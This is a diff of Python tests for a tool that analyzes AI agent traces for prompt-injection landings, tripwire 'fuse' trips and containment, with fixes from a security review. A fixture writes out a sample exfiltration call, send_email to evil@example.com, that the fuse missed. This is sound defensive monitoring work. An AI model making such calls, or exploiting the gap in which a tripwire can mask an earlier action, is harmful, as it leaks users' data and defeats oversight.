@@ -100,9 +100,13 @@ def test_fuse_snapshot_without_trip_falls_back():
 
 
 def test_fuse_snapshot_with_no_landing_at_all():
+    """Not CLEAN: a snapshot exists only because a tripwire fired, so a ring with
+    no tripped call means the trip can't be located, not that nothing happened
+    (corrected after the 2026-10-09 review; see finding 6 below)."""
     text = _snapshot(events=[("read_document", "allowed")])
     f = analyze(from_jsonl(text))
-    assert f.verdict == "CLEAN" and not f.contained
+    assert f.verdict == "ATTEMPTED" and not f.contained
+    assert f.fuse_unresolved is True
 
 
 def test_inject_site_not_locatable_in_a_snapshot():
@@ -172,3 +176,56 @@ def test_fuse_rule_is_not_echoed_into_a_canary_token_list():
     t = from_jsonl(HONEYTOKEN_SNAPSHOT)
     assert t.policy.canary_tokens == ()
     assert "0f1e2d3c4b5a" not in analyze(t).landing_signal
+
+
+# --- security review findings (2026-10-09) --------------------------------
+
+def _mask_trace(*, exfil_seq=1, trip_seq=2, forbidden="send_email") -> str:
+    """An exfil the fuse never blocked, then a later harmless call that trips it."""
+    lines = [json.dumps({
+        "type": "trace", "v": 1, "trace_id": "mask", "source": "bastionfuse",
+        "policy": {"forbidden_tools": [forbidden]},
+        "fuse": {"rule": "honeytoken", "reason": "honeytoken #dead in the input of 'read'"},
+    })]
+    ev = {exfil_seq: {"tool": forbidden, "args": {"to": "evil@example.com"}},
+          trip_seq: {"tool": "read", "args": {}, "verdict": "tripped"}}
+    for seq in sorted(ev):
+        lines.append(json.dumps({"type": "tool_call", "seq": seq, **ev[seq]}))
+    return "\n".join(lines) + "\n"
+
+
+def test_fuse_trip_does_not_mask_an_earlier_unblocked_landing():
+    """Finding 1. A fuse that blocked call N cannot vouch for calls it allowed
+    earlier: reporting `contained` there tells an analyst the exfil was stopped
+    when it was not."""
+    f = analyze(from_jsonl(_mask_trace()))
+    assert f.landed
+    assert f.landing_seq == 1, "the earliest landing wins, not the fuse trip"
+    assert f.landing_kind == "action"
+    assert f.contained is False, "nothing blocked the send_email"
+    assert any("fuse" in n and "2" in n for n in f.notes), f.notes
+
+
+def test_fuse_trip_is_the_landing_when_it_is_the_earliest():
+    """The 0.6.0 behaviour still holds when the trip is the first landing."""
+    f = analyze(from_jsonl(_mask_trace(exfil_seq=3, trip_seq=2)))
+    assert f.landing_seq == 2 and f.landing_kind == "fuse"
+    assert f.contained is True
+
+
+def test_tripped_call_in_forbidden_tools_is_one_event_not_two():
+    """Same seq for both candidates: the fuse's reason is the better signal."""
+    text = _snapshot(rule="canary", events=[("debug_dump_env", "tripped")],
+                     policy={"forbidden_tools": ["debug_dump_env"]})
+    f = analyze(from_jsonl(text))
+    assert f.landing_kind == "fuse" and f.contained is True
+
+
+def test_fuse_header_without_a_tripped_call_is_not_silently_clean():
+    """Finding 6. A snapshot exists because something tripped; a ring with no
+    tripped call (truncated, or the call evicted) must not read as CLEAN."""
+    text = _snapshot(events=[("read_document", "allowed")])
+    f = analyze(from_jsonl(text))
+    assert f.verdict != "CLEAN", f
+    assert any("no call is marked tripped" in n for n in f.notes), f.notes
+    assert f.contained is False
